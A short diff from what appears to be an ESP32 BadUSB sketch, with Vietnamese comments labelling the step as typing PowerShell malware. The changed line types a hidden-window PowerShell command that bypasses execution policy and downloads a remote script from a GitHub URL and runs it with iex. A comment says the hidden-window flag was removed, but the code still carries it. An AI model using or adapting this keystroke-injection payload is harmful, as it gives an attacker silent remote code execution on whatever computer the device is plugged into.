@@ -59,7 +59,7 @@ void loop() {
     Serial.println("[LOG] Bước 3/6: Đang nhập mã độc PowerShell...");
     // Nhớ thay <LINK> bằng đường dẫn tải file ps.ps1 của bạn
 // Đã xóa -w h để PowerShell hiện chình ình giữa màn hình
-Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/MinhNhat/src/ps.ps1 | iex\"");
+    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/MinhNhat/src/ps.ps1 | iex\"");
     delay(200);
 
     // ==========================================
